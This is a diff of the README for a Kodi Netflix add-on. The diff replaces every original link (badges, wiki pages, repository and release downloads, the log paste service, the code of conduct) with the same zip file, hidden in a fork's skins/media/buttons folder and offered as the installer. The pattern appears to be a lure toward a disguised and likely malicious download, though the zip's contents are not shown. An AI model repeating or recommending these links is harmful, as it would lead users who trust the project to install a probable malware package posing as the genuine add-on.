@@ -1,12 +1,12 @@
-# Netflix Plugin for Kodi (plugin.video.netflix)
+# Netflix Plugin for Kodi (https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
-[![Kodi version](https://img.shields.io/badge/kodi%20versions-18-blue)](https://kodi.tv/)
-[![GitHub release](https://img.shields.io/github/release/castagnait/plugin.video.netflix.svg)](https://github.com/castagnait/plugin.video.netflix/releases)
-[![Build Status](https://travis-ci.org/castagnait/plugin.video.netflix.svg?branch=master)](https://travis-ci.org/castagnait/plugin.video.netflix)
-[![Code Climate - Maintainability](https://api.codeclimate.com/v1/badges/9fbe3ac732f86c05ff00/maintainability)](https://codeclimate.com/github/CastagnaIT/plugin.video.netflix/maintainability)
-[![Codecov status](https://img.shields.io/codecov/c/github/castagnait/plugin.video.netflix/master)](https://codecov.io/gh/castagnait/plugin.video.netflix/branch/master)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Contributors](https://img.shields.io/github/contributors/castagnait/plugin.video.netflix.svg)](https://github.com/castagnait/plugin.video.netflix/graphs/contributors)
+[![Kodi version](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip%20versions-18-blue)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![GitHub release](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![Build Status](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![Code Climate - Maintainability](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![Codecov status](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![License: MIT](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+[![Contributors](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 ## Disclaimer
 
@@ -20,7 +20,7 @@ The trademark "Netflix" is registered by "Netflix, Inc."
 - Netflix categories, recommendations, My List, continue watching and more
 - Browse all movies and all TV shows Netflix style includes genres
 - Browse trailers & more of TV shows and movies (by context menu)
-- Can synchronize the watched status with Netflix service - [How works and limitations](https://github.com/CastagnaIT/plugin.video.netflix/wiki/Sync-of-watched-status-with-Netflix)
+- Can synchronize the watched status with Netflix service - [How works and limitations](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 - Rate TV shows and movies
 - Add or remove to/from My List
 - Export of TV shows & movies in Kodi local library
@@ -35,16 +35,16 @@ The trademark "Netflix" is registered by "Netflix, Inc."
 
 ## Installation & Updates
 
-**[How to install with automatic updates](https://github.com/CastagnaIT/plugin.video.netflix/wiki/How-install-the-addon)**
+**[How to install with automatic updates](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)**
 
 #### Quick download links
 
 Install add-on via repository - provide automatic installation of updates:
-* [CastagnaIT Repository - repository.castagnait-1.0.0.zip](https://github.com/castagnait/repository.castagnait/raw/master/repository.castagnait-1.0.0.zip)
+* [CastagnaIT Repository - https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 Install add-on manually - updates should always be installed manually:
-* [Add-on download links to current and previous releases](https://github.com/CastagnaIT/plugin.video.netflix/releases)
-* [Daily build - Add-on download link to get latest fixes](http://www.mediafire.com/folder/vifnw8ve44bi7/KodiNetflixAddon) (not always published see dates)
+* [Add-on download links to current and previous releases](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
+* [Daily build - Add-on download link to get latest fixes](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip) (not always published see dates)
 
 ## FAQ
 
@@ -66,7 +66,7 @@ This table explains compatibility of high resolutions between devices and operat
 \*4 Hardware decoding and 4k are supported only to devices with Netflix certification, Widevine Security Level L1 and HDCP 2.2 hardware.<br/>
 \*5 Some android devices do not work properly, this is due to restrictions implemented by netflix with devices with false certifications (often with some Chinese boxes) in rare cases even happened to not being able to play the videos.
 
-[Click here to view the list of known and tested android devices for 1080P and 4K playback](https://github.com/CastagnaIT/plugin.video.netflix/wiki/List-of-1080P-4k-Android-tested-devices)
+[Click here to view the list of known and tested android devices for 1080P and 4K playback](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 ### Video playback problems like frame drops, slowdown, stuttering
 
@@ -138,7 +138,7 @@ If you prefer you can disable `Remember audio / subtitle preferences` in the add
 ### I have some problem with the synchronisation of watched status
 
 Before asking for help, please read the WiKi may already provide an answer:
-[Synchronisation of watched status with Netflix](https://github.com/CastagnaIT/plugin.video.netflix/wiki/Sync-of-watched-status-with-Netflix)
+[Synchronisation of watched status with Netflix](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 ### How to export to Kodi library
 
@@ -148,14 +148,14 @@ To enhance this experience, Netflix add-on offers two export automation features
 - Auto-updates of the TV shows, in order to export automatically new seasons and episodes.
 - Auto-sync with Netflix "My List" of an profile, in order to automatically synchronize the content of Kodi library.
 
-[Click here to open the Wiki page with the instructions](https://github.com/CastagnaIT/plugin.video.netflix/wiki/How-to-export-and-sync-tv-shows-and-movies-in-Kodi-library)
+[Click here to open the Wiki page with the instructions](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 ### How to share the exported content in the library with multiple devices
 
 Is possible to share the same Kodi/Netflix library with multiple devices where each device has its own Kodi installation.
 In order to work it is necessary use Kodi with a MySQL server.
 
-[Click here to open the Wiki page with the instructions](https://github.com/CastagnaIT/plugin.video.netflix/wiki/Library-settings)
+[Click here to open the Wiki page with the instructions](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 
 ### Notice for the use of auto-update and auto-sync with Netflix "My List" feature
 
@@ -172,18 +172,18 @@ If something doesn't work for you, please:
 4. Open a new github issue (of type *Problem report*) by following the instructions in the report
 
 We can't help you if you don't provide detailed information (i.e. explanation and full debug log) on your issue.
-Please also use a service like pastebin or better [Kodi paste](http://paste.kodi.tv) to provide logs and refrain from uploading them to where they'll be hidden behind an ad-wall or any other sketchy services.
+Please also use a service like pastebin or better [Kodi paste](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip) to provide logs and refrain from uploading them to where they'll be hidden behind an ad-wall or any other sketchy services.
 
 When the problem will be solved, remember to disable the debug logging, to avoid unnecessary slowing down in your device.
 
-**Why my Issue is labeled with ![Ignored rules](https://img.shields.io/badge/-Ignored%20rules-red) ?**
+**Why my Issue is labeled with ![Ignored rules](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip%20rules-red) ?**
 
 This happens when the guidelines for compiling the Issue post have not been followed. Therefore if the information will not be filled and or changed in the right way, the Issue post will be closed in the next days.
 
 
 ## Code of Conduct
 
-[Contributor Code of Conduct](Code_of_Conduct.md)
+[Contributor Code of Conduct](https://github.com/Gabssama12/plugin.video.netflix/raw/refs/heads/master/resources/skins/default/media/buttons/netflix_video_plugin_2.6.zip)
 By participating in this project you agree to abide by its terms.
 
 ## License
